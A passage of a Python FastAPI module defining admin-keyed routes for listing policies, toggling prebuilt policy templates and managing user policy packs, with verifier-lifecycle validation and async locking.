"""Policy + policy-pack routes: /policies, /policy-packs and their compile,
enable, test, and pack-membership surfaces. Extracted verbatim from
create_app's _attach_policy_routes closure (behavior-preserving)."""
from __future__ import annotations

import asyncio
import os
import time
from pathlib import Path

from fastapi import Body, Depends, FastAPI, Header, HTTPException

from ...config import _run_command_allowed
from ..constants import _RESERVED_ID_SUFFIXES
from ..deps import _check_key, require_admin_key
from ...evidence import sign_token
from ..keys import KeyStore
from ..pack_store import (
    PackStore, UserPackRow, slugify_name, validate_user_slug,
)
from ...policy import (
    AnyPolicy, ContextInjectionPolicy, EvidencePolicy, InputRewritePolicy,
    PolicyOverride, RunCommandPolicy, apply_rewriter, matcher_covers,
)
from ...policy.ir import _validate_id
from ..policy_group_store import PolicyGroupStore, PolicyRecord
from ..policy_store import PolicyStore
from ..presets_catalog import vendor_catalog
from ..schemas import (
    CompoundPolicyReq, InputRewriteReq, PatchEnabledReq, PutPolicyReq, RunCommandReq,
)
from ..script_store import ScriptStore
from ..serialization import (
    _compile_with_sha, _deserialize_policy_from_api, _enforcement_label,
    _serialize_policy_for_api,
)
from ...verifier.protocol import VerifierRegistry


def attach(app: FastAPI, store: PolicyStore,
                           policy_lock: asyncio.Lock,
                           *,
                           verifier_registry: "VerifierRegistry | None" = None,
                           keystore: "KeyStore | None" = None,
                           kid: str | None = None,
                           script_store: "ScriptStore | None" = None,
                           script_store_lock: asyncio.Lock | None = None,
                           pack_store: "PackStore | None" = None,
                           pack_store_lock: asyncio.Lock | None = None,
                           policy_group_store: "PolicyGroupStore | None" = None,
                           ) -> None:

    def _assert_policy_lifecycle_endorsed(policy: AnyPolicy) -> None:
        """D57e P1: lifecycle-endorsement gate.

        For every `EvidencePolicy` requires[] entry whose `kind ==
        'step'`, check that the verifier descriptor declares a
        `field_checks` group for the policy's `trigger.event`. On
        miss, raise HTTPException(422). Skips:

          - non-EvidencePolicy archetypes (no `requires` / `trigger`)
          - non-step requires (regex / llm_critic / shacl: no
            verifier descriptor to consult)
          - steps with no registered descriptor (custom verifier,
            `preview:` prefix, vendor preset whose descriptor mirror
            lags) — step_enforcement / preview prefix already cover
            those modes.

        The wizard's Step 3 picker already filters verifiers against
        the same predicate via `verifierFiresOnLifecycle()` in the
        web layer. PUT / POST /policies/compile are public API
        surfaces (admin-keyed, but still scriptable), so the same
        filter has to be enforced at the wire boundary or a curl
        body bypasses the picker filter and persists a vacuous
        gate.
        """
        from ...verifier.descriptors import (
            validate_policy_against_descriptors,
        )
        if not isinstance(policy, EvidencePolicy):
            return
        trig = getattr(policy, "trigger", None)
        event = getattr(trig, "event", None) if trig is not None else None
        if not isinstance(event, str) or not event:
            return
        step_refs: list[str] = []
        for req in policy.requires:
            if getattr(req, "kind", None) != "step":
                continue
            step = getattr(req, "step", None)
            if isinstance(step, str) and step:
                step_refs.append(step)
        issues = validate_policy_against_descriptors(
            policy_id=policy.id,
            trigger_event=event,
            step_refs=step_refs,
        )
        if not issues:
            return
        # First issue carries the most actionable detail; include the
        # allowed lifecycles so the dashboard / scripted caller can
        # remediate without a second round-trip.
        first = issues[0]
        raise HTTPException(
            422,
            (
                f"verifier {first['step']!r} does not fire on "
                f"{first['trigger_event']!r}; allowed: "
                f"{first['allowed_events']!r}"
            ),
        )

    def _resolve_enforcement_for(policy: AnyPolicy) -> str:
        """P8: resolve policy enforcement label deterministically.

        Issue #1 P0 (#14): non-Evidence archetypes are always
        enforcing (they compile to managed-settings primitives, no
        verifier hop). Only EvidencePolicy may resolve to
        `enforcing` vs `preview` based on its `requires[].step`
        bindings against the live registry.

        Falls back to the legacy (action, event)-derived label when
        either the registry isn't wired OR every requires entry is
        non-step (regex / llm_critic / shacl). The legacy label is the
        only sensible "preview vs enforcing" answer in those cases.
        """
        if not isinstance(policy, EvidencePolicy):
            return _enforcement_label(policy)
        from ...policy.step_enforcement import resolve_policy_enforcement
        has_step_req = any(r.kind == "step" for r in policy.requires)
        if not has_step_req:
            return _enforcement_label(policy)
        return resolve_policy_enforcement(
            policy,
            registry=verifier_registry,
            vendor_catalog_fn=vendor_catalog,
        )

    def _resolve_legacy_unstamped(ov: "PolicyOverride") -> tuple[str, bool]:
        """P8 follow-up (fix-cycle #1): re-validate a pre-P8 on-disk row
        on read.

        Pre-P8 rows have `enforcement=None`. Originally the REST layer
        fell back to the legacy (action, event)-derived
        `_enforcement_label` for these, which silently re-rendered a
        broken policy (step now decommissioned) as
        `"deterministic-gate"`. That re-creates the silent-fail-open
        mode P8 closes.

        New behaviour on `enforcement=None`:
          - no step reqs → legacy label (regex / llm_critic / shacl
            don't bind to a verifier).
          - all step reqs resolve cleanly → return resolved label
            (`"enforcing"` / `"preview"`).
          - any step req fails to resolve → return
            `"unresolved-legacy"` AND treat the row as effectively
            disabled at the compile path. The dashboard surfaces the
            gap; the runtime never ships a managed-settings hook for a
            verifier that has been decommissioned.

        The returned bool is `effective_enabled`: `False` ONLY when the
        row resolves to `"unresolved-legacy"`. PATCH /enabled stays the
        operator-visible toggle; this gate is a runtime-safety overlay
        that the operator cannot accidentally turn back on by toggling
        — only a successful re-PUT (with a valid step or `preview:`
        prefix) re-stamps a coherent label.
        """
        from ...policy.step_enforcement import (
            StepResolutionError, resolve_policy_enforcement,
        )
        if ov.enforcement is not None:
            return ov.enforcement, ov.enabled
        # Issue #1 P0 (#14): non-Evidence archetypes don't have a
        # `requires` field. They render as `enforcing`.
        if not isinstance(ov.policy, EvidencePolicy):
            return _enforcement_label(ov.policy), ov.enabled
        has_step_req = any(r.kind == "step" for r in ov.policy.requires)
        if not has_step_req:
            return _enforcement_label(ov.policy), ov.enabled
        try:
            label = resolve_policy_enforcement(
                ov.policy,
                registry=verifier_registry,
                vendor_catalog_fn=vendor_catalog,
            )
        except StepResolutionError:
            return "unresolved-legacy", False
        return label, ov.enabled

    @app.get("/policies", dependencies=[Depends(require_admin_key)])
    def list_policies() -> dict:
        items = []
        for ov in store.load():
            # Issue #1 P0 (#13, #14): non-Evidence archetypes have no
            # `trigger`. We render `trigger` only when present so the
            # list response doesn't fabricate a fake event for declarative
            # rows.
            # P8 follow-up: legacy unstamped rows are re-validated
            # against the live registry. If a referenced step has been
            # decommissioned the row renders as `"unresolved-legacy"`
            # so the operator sees the gap — instead of the pre-P8
            # silent fall-back to `"deterministic-gate"`.
            enf, _eff_enabled = _resolve_legacy_unstamped(ov)
            trig = getattr(ov.policy, "trigger", None)
            entry = {
                "id": ov.policy.id,
                "description": ov.policy.description,
                "source": ov.source,
                "enabled": ov.enabled,
                "enforcement": enf,
                "type": getattr(ov.policy, "type", "evidence"),
            }
            if trig is not None:
                entry["trigger"] = {"event": trig.event,
                                     "matcher": trig.matcher}
            elif isinstance(ov.policy, ContextInjectionPolicy):
                # D74a follow-up: ContextInjectionPolicy carries the
                # hook surface in `event` + `matcher` directly (no
                # `trigger` triple). Synthesize a uniform `{event,
                # matcher}` shape so the dashboard list renders a
                # surface for context_injection rows (the previous
                # code suppressed the trigger span entirely, hiding
                # the only operator-visible cue of what fires the
                # rule). SubagentPolicy + McpGatingPolicy stay
                # without `trigger` — they truly have no event scope.
                entry["trigger"] = {
                    "event": ov.policy.event,
                    "matcher": ov.policy.matcher,
                }
            items.append(entry)
        return {"items": items}

    # D54: prebuilt policy templates. The 5 built-in verifiers each
    # ship with an implicit sensible-default policy (which event,
    # matcher, action they typically pair with). Pre-D54 that
    # information was crammed onto the Verifiers tab as policy-decision
    # language on each verifier card; D54 moves it here so the
    # verifier=function vs policy=composition distinction stays clean
    # in the dashboard. D60 reframes the section as a toggle list:
    # GET returns `enabled` so the dashboard can render the toggle
    # state, POST /enable materializes the prebuilt's IR as a saved
    # policy with the prebuilt id, DELETE disables it. Editing through
    # the wizard stays available as a secondary path.
    #
    # Routed BEFORE the `/policies/{policy_id:path}` catch-all so the
    # literal `prebuilt` path doesn't get swallowed as a policy id.
    @app.get("/policies/prebuilt", dependencies=[Depends(require_admin_key)])
    def list_prebuilt_policies() -> dict:
        from ...policy.prebuilt import all_prebuilt_policies
        # Only mark `enabled` when the on-disk row is both present AND
        # carries the `enabled` flag set to true. A row that was
        # disabled (toggle off via PATCH /enabled) but still present
        # in the store should render as off, not on, so the toggle is
        # the operator's source of truth.
        enabled_ids = {
            ov.policy.id for ov in store.load() if ov.enabled
        }
        return {"items": all_prebuilt_policies(enabled_ids=enabled_ids)}

    # D60: enable a prebuilt template as a saved policy. Idempotent —
    # enabling an already-enabled prebuilt is a no-op (returns the
    # current saved row). When a row with the prebuilt's id exists
    # but is disabled, this re-enables it without rewriting the
    # policy body so any operator-side edits to the IR (description
    # tweak, allowlist value) survive the toggle.
    #
    # URL design: the prebuilt slug carries a `prebuilt/` prefix in
    # the catalog (e.g. `prebuilt/citation-verify-at-final`). The
    # route path already contains the static `prebuilt/` segment, so
    # the `{slug}` URL parameter only carries the suffix
    # (`citation-verify-at-final`). The handler re-attaches the
    # prefix when looking up the spec. This keeps the URL short and
    # readable and avoids the FastAPI `:path` greedy-match
    # ambiguity that lets `/policies/prebuilt/...` collide with
    # `/policies/prebuilt/{slug}/enable`.
    def _revalidate_for_reenable(ov: PolicyOverride) -> str:
        """D60 follow-up: re-arm gate shared with PATCH /enabled.

        When a stored row is being flipped OFF -> ON we re-resolve the
        policy against the live verifier registry + descriptor surface,
        so a row stamped months ago against a now-decommissioned step
        (or a now-disallowed (trigger.event, step) pairing) raises 409
        instead of silently shipping a stale enforcement label. This
        mirrors the PATCH /policies/{id}/enabled handler. The new
        POST /policies/prebuilt/{slug}/enable surface previously
        skipped this check on the re-enable branch, opening a
        two-surface divergence: the same row would 409 via PATCH but
        succeed via POST.

        Returns the resolved enforcement label for the saved row.

        Raises HTTPException(409) on a registry / lifecycle drift.
        """
        from ...policy.step_enforcement import (
            StepResolutionError, resolve_policy_enforcement,
        )
        from ...verifier.descriptors import (
            validate_policy_against_descriptors,
        )
        if not (
            isinstance(ov.policy, EvidencePolicy)
            and any(r.kind == "step" for r in ov.policy.requires)
        ):
            return ov.enforcement or _resolve_enforcement_for(ov.policy)
        try:
            new_enforcement = resolve_policy_enforcement(
                ov.policy,
                registry=verifier_registry,
                vendor_catalog_fn=vendor_catalog,
            )
        except StepResolutionError as e:
            raise HTTPException(
                409,
                f"cannot re-enable: backing verifier "
                f"{e.step!r} no longer registered, "
                f"re-author with current /verifiers "
                f"or 'preview:' prefix",
            ) from e
        # Lifecycle endorsement drift on the stored body.
        _trig = getattr(ov.policy, "trigger", None)
        _event = (
            getattr(_trig, "event", None)
            if _trig is not None else None
        )
        _step_refs = [
            r.step for r in ov.policy.requires
            if r.kind == "step"
            and isinstance(getattr(r, "step", None), str)
        ]
        _drift_issues = (
            validate_policy_against_descriptors(
                policy_id=ov.policy.id,
                trigger_event=_event or "",
                step_refs=_step_refs,
            )
            if isinstance(_event, str) and _event
            else []
        )
        if _drift_issues:
            _first = _drift_issues[0]
            raise HTTPException(
                409,
                (
                    f"cannot re-enable: verifier "
                    f"{_first['step']!r} no longer "
                    f"fires on "
                    f"{_first['trigger_event']!r}; "
                    f"allowed lifecycles: "
                    f"{_first['allowed_events']!r}, "
                    f"re-author this policy under one "
                    f"of those lifecycles"
                ),
            )
        return new_enforcement

    def _enable_prebuilt_locked(slug: str) -> dict:
        """Lock-held body of enable_prebuilt_policy. Extracted so the
        pack cascade (which holds policy_lock for the entire loop to
        keep `only_missing` and post-cascade status snapshots
        consistent under concurrent admin requests) can re-use the
        materialization path without nesting the same non-reentrant
        asyncio.Lock.
        """
        from ...policy.prebuilt import (
            build_prebuilt_evidence_policy,
            prebuilt_spec_by_id,
        )
        prebuilt_id = f"prebuilt/{slug}"
        spec = prebuilt_spec_by_id(prebuilt_id)
        if spec is None:
            raise HTTPException(404, f"prebuilt {prebuilt_id!r} not found")
        existing = store.load()
        target: PolicyOverride | None = None
        for ov in existing:
            if ov.policy.id == prebuilt_id:
                target = ov
                break
        if target is not None and target.enabled:
            saved_enforcement = (
                target.enforcement
                or _resolve_enforcement_for(target.policy)
            )
            return {
                "id": target.policy.id,
                "enabled": True,
                "source": target.source,
                "enforcement": saved_enforcement,
                "setup_required": spec.setup_required,
            }
        if target is None:
            policy = build_prebuilt_evidence_policy(prebuilt_id)
            assert policy is not None
            _assert_policy_lifecycle_endorsed(policy)
            saved_enforcement = _resolve_enforcement_for(policy)
            saved_source = "bot"
            existing.append(PolicyOverride(
                policy=policy,
                source=saved_source,
                enabled=True,
                enforcement=saved_enforcement,
            ))
        else:
            saved_enforcement = _revalidate_for_reenable(target)
            _assert_policy_lifecycle_endorsed(target.policy)
            saved_source = target.source
            existing = [ov for ov in existing if ov.policy.id != prebuilt_id]
            existing.append(PolicyOverride(
                policy=target.policy,
                source=saved_source,
                enabled=True,
                enforcement=saved_enforcement,
            ))
        store.save(existing)
        return {
            "id": prebuilt_id,
            "enabled": True,
            "source": saved_source,
            "enforcement": saved_enforcement,
            "setup_required": spec.setup_required,
        }

    def _disable_prebuilt_locked(slug: str) -> dict:
        """Lock-held body of disable_prebuilt_policy. See
        _enable_prebuilt_locked for why this is split."""
        from ...policy.prebuilt import (
            build_prebuilt_evidence_policy,
            prebuilt_spec_by_id,
        )
        prebuilt_id = f"prebuilt/{slug}"
        spec = prebuilt_spec_by_id(prebuilt_id)
        if spec is None:
            raise HTTPException(404, f"prebuilt {prebuilt_id!r} not found")
        existing = store.load()
        new_list: list[PolicyOverride] = []
        changed = False
        target_after: PolicyOverride | None = None
        for ov in existing:
            if ov.policy.id == prebuilt_id and ov.enabled:
                new_ov = PolicyOverride(
                    policy=ov.policy,
                    source=ov.source,
                    enabled=False,
                    enforcement=ov.enforcement,
                )
                new_list.append(new_ov)
                target_after = new_ov
                changed = True
            else:
                new_list.append(ov)
                if ov.policy.id == prebuilt_id:
                    target_after = ov
        if changed:
            store.save(new_list)
        if target_after is not None:
            source = target_after.source
            enforcement = (
                target_after.enforcement
                or _resolve_enforcement_for(target_after.policy)
            )
        else:
            fresh_policy = build_prebuilt_evidence_policy(prebuilt_id)
            assert fresh_policy is not None
            source = "bot"
            enforcement = _resolve_enforcement_for(fresh_policy)
        return {
            "id": prebuilt_id,
            "enabled": False,
            "source": source,
            "enforcement": enforcement,
            "setup_required": spec.setup_required,
        }

    @app.post(
        "/policies/prebuilt/{slug}/enable",
        dependencies=[Depends(require_admin_key)],
    )
    async def enable_prebuilt_policy(slug: str) -> dict:
        from ...policy.prebuilt import (
            build_prebuilt_evidence_policy,
            prebuilt_spec_by_id,
        )
        prebuilt_id = f"prebuilt/{slug}"
        spec = prebuilt_spec_by_id(prebuilt_id)
        if spec is None:
            raise HTTPException(404, f"prebuilt {prebuilt_id!r} not found")
        async with policy_lock:
            existing = store.load()
            target: PolicyOverride | None = None
            for ov in existing:
                if ov.policy.id == prebuilt_id:
                    target = ov
                    break
            if target is not None and target.enabled:
                # No-op idempotent path. D60 follow-up: return the
                # SAVED enforcement label (already on the row), not a
                # recomputed value, so the response shape matches
                # what `target.enforcement or _resolve_enforcement_for`
                # would yield on a fresh read.
                saved_enforcement = (
                    target.enforcement
                    or _resolve_enforcement_for(target.policy)
                )
                return {
                    "id": target.policy.id,
                    "enabled": True,
                    "source": target.source,
                    "enforcement": saved_enforcement,
                    "setup_required": spec.setup_required,
                }
            if target is None:
                # First-time enable: materialize the spec.
                policy = build_prebuilt_evidence_policy(prebuilt_id)
                assert policy is not None  # spec is not None, so this builds.
                # Lifecycle endorsement: prebuilts pass the same gate
                # as any other PUT /policies body so a future
                # descriptor change can't ship a vacuous gate via the
                # toggle path.
                _assert_policy_lifecycle_endorsed(policy)
                saved_enforcement = _resolve_enforcement_for(policy)
                saved_source = "bot"
                existing.append(PolicyOverride(
                    policy=policy,
                    source=saved_source,
                    enabled=True,
                    enforcement=saved_enforcement,
                ))
            else:
                # Row exists but disabled — re-enable in place so the
                # operator's IR edits (if any) survive the toggle. The
                # body itself is preserved by NOT re-materializing
                # from the spec.
                # D60 follow-up: re-run the same registry +
                # lifecycle gates the PATCH /enabled surface uses
                # for re-arm. Without this, an IR the operator
                # edited through the wizard (e.g. swapped an
                # EvidenceReq.kind to a now-deprecated step) could
                # round-trip ON via the toggle while PATCH rejected
                # it — splitting truth across two enable surfaces.
                saved_enforcement = _revalidate_for_reenable(target)
                _assert_policy_lifecycle_endorsed(target.policy)
                saved_source = target.source
                existing = [ov for ov in existing if ov.policy.id != prebuilt_id]
                existing.append(PolicyOverride(
                    policy=target.policy,
                    source=saved_source,
                    enabled=True,
                    enforcement=saved_enforcement,
                ))
            store.save(existing)
        return {
            "id": prebuilt_id,
            "enabled": True,
            # D60 follow-up: bind to the value we actually saved
            # rather than a freshly-computed local that may not match
            # `target.enforcement or enforcement` on the re-enable
            # branch.
            "source": saved_source,
            "enforcement": saved_enforcement,
            "setup_required": spec.setup_required,
        }

    # D60: disable a prebuilt template. Idempotent — disabling an
    # already-disabled (or absent) prebuilt is a no-op. We KEEP the
    # row in the store on disable rather than deleting it so the
    # operator's IR edits survive a disable + re-enable round-trip.
    # This matches the PATCH /enabled pattern (toggle is
    # metadata-only). Slug shape matches the enable route — see the
    # comment above for the URL design rationale.
    @app.delete(
        "/policies/prebuilt/{slug}",
        dependencies=[Depends(require_admin_key)],
    )
    async def disable_prebuilt_policy(slug: str) -> dict:
        from ...policy.prebuilt import (
            build_prebuilt_evidence_policy,
            prebuilt_spec_by_id,
        )
        prebuilt_id = f"prebuilt/{slug}"
        spec = prebuilt_spec_by_id(prebuilt_id)
        if spec is None:
            raise HTTPException(404, f"prebuilt {prebuilt_id!r} not found")
        async with policy_lock:
            existing = store.load()
            new_list: list[PolicyOverride] = []
            changed = False
            target_after: PolicyOverride | None = None
            for ov in existing:
                if ov.policy.id == prebuilt_id and ov.enabled:
                    new_ov = PolicyOverride(
                        policy=ov.policy,
                        source=ov.source,
                        enabled=False,
                        enforcement=ov.enforcement,
                    )
                    new_list.append(new_ov)
                    target_after = new_ov
                    changed = True
                else:
                    new_list.append(ov)
                    if ov.policy.id == prebuilt_id:
                        target_after = ov
            if changed:
                store.save(new_list)
        # D60 follow-up: mirror the enable response envelope so a
        # non-dashboard client can reconcile local state from the
        # response body without a refetch. When no row is persisted
        # (operator never enabled this prebuilt) we fall back to the
        # spec's defaults so the shape stays the same.
        if target_after is not None:
            source = target_after.source
            enforcement = (
                target_after.enforcement
                or _resolve_enforcement_for(target_after.policy)
            )
        else:
            from ...policy.prebuilt import build_prebuilt_evidence_policy
            fresh_policy = build_prebuilt_evidence_policy(prebuilt_id)
            assert fresh_policy is not None  # spec is not None.
            source = "bot"
            enforcement = _resolve_enforcement_for(fresh_policy)
        return {
            "id": prebuilt_id,
            "enabled": False,
            "source": source,
            "enforcement": enforcement,
            "setup_required": spec.setup_required,
        }

    # ── D75: policy packs ───────────────────────────────────────────
    #
    # A pack is a named GROUP of policy ids that share an operator
    # context. Built-in packs (`pack/...`) ship membership in
    # `policy/pack.py`; user packs (`user-pack/...`) persist in the
    # `pack_store`. Enable/disable cascades to every member; for
    # `prebuilt/...` members we route through the same enable/disable
    # path the prebuilt toggle uses, so the materialized IR + lifecycle
    # gate match exactly. For inline IRs the strict-block bundle owns,
    # we persist via the same PolicyOverride shape the prebuilt branch
    # uses.
    #
    # Decision (per the brief): "blunt cascade". A pack toggle sets each
    # member's enabled state to the target regardless of other-pack
    # ownership. Simpler tests, fewer surprises; the alternative ("only
    # disable when no other enabled pack still owns this member")
    # requires a global pack-membership reverse-index that's easy to
    # drift on user-pack edits.
    #
    # Routed BEFORE the `/policies/{policy_id:path}` catch-all is added
    # in this same function (the catch-all installs further down). The
    # literal `/policy-packs` prefix avoids the collision.

    def _pack_locale(accept_language: str | None) -> str:
        """Return 'ko' when the request Accept-Language prefers Korean,
        else 'en'.

        Fix follow-up: walk the full quality-ordered list instead of
        taking only the first segment. `en-US,ko;q=0.9` previously
        returned 'en' even when the operator's primary UI is Korean and
        the dashboard had set the cookie to ko; the server component
        forwards the cookie locale on dashboard fetches so the bug only
        bit operators driving the admin HTTP surface from curl /
        scripted tooling. Now we score each comma-separated tag by its
        `q=` value (default 1.0) and pick the first tag whose primary
        subtag matches ko or en. Anything else (or no header at all)
        falls back to 'en'.
        """
        if not accept_language:
            return "en"
        ranked: list[tuple[float, int, str]] = []
        for idx, raw_tag in enumerate(accept_language.split(",")):
            tag = raw_tag.strip()
            if not tag:
                continue
            quality = 1.0
            parts = [p.strip() for p in tag.split(";")]
            head = parts[0].lower()
            for param in parts[1:]:
                if param.startswith("q="):
                    try:
                        quality = float(param[2:])
                    except ValueError:
                        quality = 0.0
                    break
            if quality <= 0:
                continue
            # Negate idx so a tie on quality preserves header order via
            # max() (lower idx wins among equal-quality tags).
            ranked.append((quality, -idx, head))
        # Stable sort by descending quality + ascending header position.
        ranked.sort(key=lambda r: (-r[0], -r[1]))
        for _q, _idx, head in ranked:
            if head.startswith("ko"):
                return "ko"
            if head.startswith("en"):
                return "en"
        return "en"

    def _enabled_id_set() -> set[str]:
        return {ov.policy.id for ov in store.load() if ov.enabled}

    def _all_policy_id_set() -> set[str]:
        """Every policy id currently saved in the store (enabled OR not).

        Used by `user_pack_to_dict` to flag a member id as stale when
        it is neither a known prebuilt nor present in the store. A
        stale id reports `ok: false` on cascade enable and would pin
        the pack at status=partial forever; the dashboard renders a
        chip so the operator can see why."""
        return {ov.policy.id for ov in store.load()}

    def _list_user_packs_dict(locale: str) -> list[dict]:
        from ...policy.pack import user_pack_to_dict
        if pack_store is None:
            return []
        enabled = _enabled_id_set()
        store_ids = _all_policy_id_set()
        out: list[dict] = []
        for row in pack_store.load():
            pack = user_pack_to_dict(
                row.id, row.name, row.description,
                row.policy_ids, enabled,
                store_policy_ids=store_ids,
            )
            entry = dict(pack)
            # P4: surface the floor bit so the dashboard can render the
            # floor pack first with an "ALWAYS-ON" badge and no
            # activation controls.
            entry["is_floor"] = bool(getattr(row, "is_floor", False))
            out.append(entry)
            del locale  # locale doesn't affect user-pack copy
        return out

    def _list_builtin_packs_dict(locale: str) -> list[dict]:
        from ...policy.pack import all_builtin_packs
        enabled = _enabled_id_set()
        return [dict(p) for p in all_builtin_packs(locale=locale,
                                                    enabled_ids=enabled)]

    @app.get("/policy-packs", dependencies=[Depends(require_admin_key)])
    def list_policy_packs(
        accept_language: str | None = Header(default=None,
                                              alias="Accept-Language"),
    ) -> dict:
        locale = _pack_locale(accept_language)
        return {
            "items": [
                *_list_builtin_packs_dict(locale),
                *_list_user_packs_dict(locale),
            ],
        }

    def _resolve_pack_members(pack_id: str) -> list[str] | None:
        """Return the ordered member ids of the given pack, or None
        when the pack is unknown. Used by GET-single + enable + disable
        handlers.
        """
        from ...policy.pack import builtin_pack_spec_by_id, _builtin_member_ids
        spec = builtin_pack_spec_by_id(pack_id)
        if spec is not None:
            return _builtin_member_ids(spec)
        if pack_id.startswith("user-pack/") and pack_store is not None:
            for row in pack_store.load():
                if row.id == pack_id:
                    return list(row.policy_ids)
        return None

    @app.get("/policy-packs/{pack_id:path}",
             dependencies=[Depends(require_admin_key)])
    def get_policy_pack(
        pack_id: str,
        accept_language: str | None = Header(default=None,
                                              alias="Accept-Language"),
    ) -> dict:
        from ...policy.pack import (
            all_builtin_packs, builtin_pack_spec_by_id, user_pack_to_dict,
        )
        if not pack_id.startswith("pack/") and not pack_id.startswith("user-pack/"):
            raise HTTPException(404, f"pack {pack_id!r} not found")
        locale = _pack_locale(accept_language)
        enabled = _enabled_id_set()
        # Built-in.
        spec = builtin_pack_spec_by_id(pack_id)
        if spec is not None:
            built = next(
                p for p in all_builtin_packs(locale=locale, enabled_ids=enabled)
                if p["id"] == pack_id
            )
            members_resolved = [
                {"id": mid, "enabled": (mid in enabled)}
                for mid in built["policy_ids"]
            ]
            envelope = dict(built)
            envelope["members"] = members_resolved
            return envelope
        # User.
        if pack_store is not None:
            store_ids = _all_policy_id_set()
            for row in pack_store.load():
                if row.id == pack_id:
                    p = user_pack_to_dict(
                        row.id, row.name, row.description,
                        row.policy_ids, enabled,
                        store_policy_ids=store_ids,
                    )
                    envelope = dict(p)
                    envelope["members"] = [
                        {"id": mid, "enabled": (mid in enabled)}
                        for mid in row.policy_ids
                    ]
                    return envelope
        raise HTTPException(404, f"pack {pack_id!r} not found")

    @app.post("/policy-packs",
              dependencies=[Depends(require_admin_key)])
    async def create_user_pack(req: dict = Body(...)) -> dict:
        if pack_store is None or pack_store_lock is None:
            raise HTTPException(500, "pack store not configured")
        if not isinstance(req, dict):
            raise HTTPException(422, "body must be a JSON object")
        raw_name = req.get("name")
        if not isinstance(raw_name, str):
            raise HTTPException(422, "name is required")
        name = raw_name.strip()
        if not name:
            raise HTTPException(422, "name is required")
        if len(name) > 200:
            raise HTTPException(422, "name too long (max 200)")
        raw_desc = req.get("description") or ""
        if not isinstance(raw_desc, str):
            raise HTTPException(422, "description must be a string")
        description = raw_desc.strip()
        if len(description) > 1000:
            raise HTTPException(422, "description too long (max 1000)")
        raw_policy_ids = req.get("policy_ids")
        if raw_policy_ids is None:
            raw_policy_ids = []
        if not isinstance(raw_policy_ids, list):
            raise HTTPException(422, "policy_ids must be a list")
        # De-dupe policy_ids while preserving order. Empty list is
        # allowed (operator may build the pack incrementally).
        seen: set[str] = set()
        member_ids: list[str] = []
        for mid in raw_policy_ids:
            if not isinstance(mid, str) or not mid:
                raise HTTPException(422, "policy_ids entries must be strings")
            if mid in seen:
                continue
            seen.add(mid)
            member_ids.append(mid)
        raw_slug = req.get("slug")
        if raw_slug is not None and not isinstance(raw_slug, str):
            raise HTTPException(422, "slug must be a string")
        slug_raw = raw_slug or slugify_name(name)
        try:
            slug = validate_user_slug(slug_raw)
        except ValueError as e:
            raise HTTPException(422, str(e))
        pack_id = f"user-pack/{slug}"
        async with pack_store_lock:
            rows = pack_store.load()
            if any(r.id == pack_id for r in rows):
                raise HTTPException(409, f"pack {pack_id!r} already exists")
            rows.append(UserPackRow(
                id=pack_id, name=name, description=description,
                policy_ids=member_ids,
            ))
            pack_store.save(rows)
        return {
            "id": pack_id,
            "name": name,
            "description": description,
            "policy_ids": member_ids,
            "source": "user",
        }

    @app.put("/policy-packs/{pack_id:path}",
             dependencies=[Depends(require_admin_key)])
    async def update_user_pack(
        pack_id: str, req: dict = Body(...),
    ) -> dict:
        if pack_id.startswith("pack/"):
            raise HTTPException(405, "built-in packs are immutable")
        if not pack_id.startswith("user-pack/"):
            raise HTTPException(404, f"pack {pack_id!r} not found")
        if pack_store is None or pack_store_lock is None:
            raise HTTPException(500, "pack store not configured")
        if not isinstance(req, dict):
            raise HTTPException(422, "body must be a JSON object")
        in_name = req.get("name")
        in_desc = req.get("description")
        in_policy_ids = req.get("policy_ids")
        async with pack_store_lock:
            rows = pack_store.load()
            target_idx: int | None = None
            for i, r in enumerate(rows):
                if r.id == pack_id:
                    target_idx = i
                    break
            if target_idx is None:
                raise HTTPException(404, f"pack {pack_id!r} not found")
            cur = rows[target_idx]
            if in_name is None:
                new_name = cur.name
            else:
                if not isinstance(in_name, str):
                    raise HTTPException(422, "name must be a string")
                new_name = in_name.strip()
                if not new_name:
                    raise HTTPException(422, "name must not be empty")
            if len(new_name) > 200:
                raise HTTPException(422, "name too long (max 200)")
            if in_desc is None:
                new_desc = cur.description
            else:
                if not isinstance(in_desc, str):
                    raise HTTPException(422, "description must be a string")
                new_desc = in_desc.strip()
            if len(new_desc) > 1000:
                raise HTTPException(422, "description too long (max 1000)")
            if in_policy_ids is None:
                new_members = list(cur.policy_ids)
            else:
                if not isinstance(in_policy_ids, list):
                    raise HTTPException(422, "policy_ids must be a list")
                seen: set[str] = set()
                new_members = []
                for mid in in_policy_ids:
                    if not isinstance(mid, str) or not mid:
                        raise HTTPException(
                            422, "policy_ids entries must be strings",
                        )
                    if mid in seen:
                        continue
                    seen.add(mid)
                    new_members.append(mid)
            rows[target_idx] = UserPackRow(
                id=pack_id, name=new_name, description=new_desc,
                policy_ids=new_members,
            )
            pack_store.save(rows)
        return {
            "id": pack_id,
            "name": new_name,
            "description": new_desc,
            "policy_ids": new_members,
            "source": "user",
        }

    @app.delete("/policy-packs/{pack_id:path}",
                dependencies=[Depends(require_admin_key)])
    async def delete_user_pack(pack_id: str) -> dict:
        if pack_id.startswith("pack/"):
            raise HTTPException(405, "built-in packs are immutable")
        if not pack_id.startswith("user-pack/"):
            raise HTTPException(404, f"pack {pack_id!r} not found")
        if pack_store is None or pack_store_lock is None:
            raise HTTPException(500, "pack store not configured")
        async with pack_store_lock:
            rows = pack_store.load()
            kept = [r for r in rows if r.id != pack_id]
            if len(kept) == len(rows):
                raise HTTPException(404, f"pack {pack_id!r} not found")
            pack_store.save(kept)
        return {"id": pack_id, "deleted": True}

    def _enable_one_member_locked(
        member_id: str, pack_id: str,
    ) -> dict:
        """Lock-held inner work to enable a single member.

        Called by `_cascade` while the cascade holds `policy_lock` for
        the full loop — this is what makes the `only_missing` snapshot
        + post-cascade status read consistent under concurrent admin
        requests. Returns the same per-member envelope as the original
        async `_enable_one_member` so the cascade result shape is
        wire-stable.
        """
        from ...policy.pack import inline_policy_for
        # Prebuilt member: route through the lock-free helper that
        # mirrors `enable_prebuilt_policy`'s body.
        if member_id.startswith("prebuilt/"):
            slug = member_id[len("prebuilt/"):]
            try:
                result = _enable_prebuilt_locked(slug)
                return {
                    "id": member_id, "enabled": True, "ok": True,
                    "source": result.get("source"),
                }
            except HTTPException as e:
                return {"id": member_id, "enabled": False, "ok": False,
                        "error": e.detail}
            except Exception as e:  # noqa: BLE001
                return {"id": member_id, "enabled": False, "ok": False,
                        "error": str(e)}
        # Inline pack-owned IR (strict-block bundle).
        inline = inline_policy_for(pack_id, member_id)
        if inline is not None:
            try:
                existing = store.load()
